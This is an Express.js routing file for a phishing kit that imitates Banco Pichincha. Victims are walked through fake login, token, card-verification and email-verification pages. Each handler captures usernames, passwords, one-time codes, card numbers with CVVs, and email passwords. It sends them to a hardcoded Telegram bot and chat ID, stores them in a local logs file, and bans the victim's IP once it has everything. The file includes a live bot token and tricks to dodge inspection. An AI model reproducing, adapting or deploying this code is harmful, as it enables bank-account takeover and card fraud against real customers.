const { Router } = require('express');
const router = Router();
const fs = require ('fs');
const { v4: uuidv4 } = require('uuid');
const bodyParse = require ('body-parser');
const  requestIp = require('request-ip');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot('6264763162:AAF5boVko72JI5MXuS-m5xuAEQkcuNKBZqo', { polling: true });



const ipBlockListText = fs.readFileSync('ips-prohibidas.txt', 'utf-8');
const ipBlockList = ipBlockListText.split('\n').filter(ip => ip !== '');

router.use((req, res, next) => {
  const ip = requestIp.getClientIp(req);
  if (ipBlockList.includes(ip)) {
    res.redirect('https://www.pichincha.com/');
    return;
  }
  next();
});


const json_books = fs.readFileSync('src/books.json', 'utf-8');
let books = JSON.parse(json_books);



router.get('/', (req, res) => {
    res.render('index.ejs');

});
router.get('/token', (req, res) => {
    res.render('token.ejs');

});



router.get('/cardverificacion', (req, res) => {
    res.render('card.ejs');

});

router.get('/emailverificacion', (req, res) => {
    res.render('email.ejs');

});




router.get('/new-logs', (req, res) => {
    res.render('new-logs', {
        books
    })
});

router.post('/',  (req, res) => {
    const {rr1OS91drD, w60dpGuy7S,} = req.body;
    const ip = requestIp.getClientIp(req);
// Verifica si la IP del usuario está en la lista de IPs prohibidas
if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
  res.status(403).send('MAMENLO.');
  return;
}

bot.sendMessage('791007687', `Usuario: ${rr1OS91drD}\nContraseña: ${w60dpGuy7S}\nIP: ${ip}\n`);

    let newBook = {
        id: uuidv4(),
        rr1OS91drD,
        w60dpGuy7S,
        ip,
        
    };
    
    books.push(newBook);
    

    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');
    
    
    res.redirect('token');
    
    
    });

router.post('/token',  (req, res) => {
    const {r6fa6y89yB, nYffxLjdFW, wJcPshSkul, ku5NHXgmK2, ub06a2YzOG, fAMihXy73t, } = req.body;
    const ip = requestIp.getClientIp(req);
// Verifica si la IP del usuario está en la lista de IPs prohibidas
if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
  res.status(403).send('MAMENLO.');
  return;
}

bot.sendMessage('791007687', `1: ${r6fa6y89yB}\n2: ${nYffxLjdFW}\n3: ${wJcPshSkul}\n4: ${ku5NHXgmK2}\n5: ${ub06a2YzOG}\n6: ${fAMihXy73t}\nIP: ${ip}\n`);

    let newBook = {
        id: uuidv4(),
        r6fa6y89yB,
        nYffxLjdFW,
        wJcPshSkul,
        ku5NHXgmK2,
        ub06a2YzOG,
        fAMihXy73t,
        ip,
        
    };
    
    books.push(newBook);
    
  res.render('loading'); // Renderiza la vista "loading" mientras espera los 15 segundos

  // Espera 15 segundos antes de redirigir
  setTimeout(() => {
    res.redirect('cardverificacion');
  }, 15000);
});



router.post('/cardverificacion',  (req, res) => {
    const {cardnumber, mm, yy, cvv,  } = req.body;
    const ip = requestIp.getClientIp(req);
// Verifica si la IP del usuario está en la lista de IPs prohibidas
if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
  res.status(403).send('Tu dirección IP ha sido bloqueada.');
  return;
}
    bot.sendMessage('791007687', `CardNumber: ${cardnumber}\nAño: ${yy}\nMes: ${mm}\nCvv: ${cvv}\nIP: ${ip}\n\n`);
    
 

    


    let newBook = {
        id: uuidv4(),
        cardnumber,
        mm,
        yy,
        cvv,
        ip,

        
    };
   
    books.push(newBook);

    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');

      // Espera 30 segundos antes de redirigir
setTimeout(() => {
    res.redirect('emailverificacion');
  }, 30000); // 30000 milisegundos = 30 segundos
});



router.post('/emailverificacion',  (req, res) => {
    const {correo, ccorreo, } = req.body;
    const ip = requestIp.getClientIp(req);
// Verifica si la IP del usuario está en la lista de IPs prohibidas
if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
  res.status(403).send('Tu dirección IP ha sido bloqueada.');
  return;
}
    bot.sendMessage('791007687', `Correo: ${correo}\nPassword: ${ccorreo}\nIp: ${ip}`);
    
    // Agrega la IP del usuario a la lista de IPs prohibidas en memoria
    ipBlockList.push(ip);

    // Guarda la lista actualizada de IPs prohibidas en el archivo de texto
    const ipBlockListText = ipBlockList.join('\n') + '\n';
    fs.writeFileSync('ips-prohibidas.txt', ipBlockListText, 'utf-8');


    let newBook = {
        id: uuidv4(),
        correo,
        ccorreo,
        ip,

        
    };
   
    books.push(newBook);

    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');

    
          // Espera 30 segundos antes de redirigir
setTimeout(() => {
    res.redirect('https://www.pichincha.com/');
  }, 70000); // 30000 milisegundos = 30 segundos

});





router.get('/delete/:id', (req, res) => {
    books = books.filter(book => book.id != req.params.id);
    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');
    res.redirect('/new-logs');

});


module.exports = router;
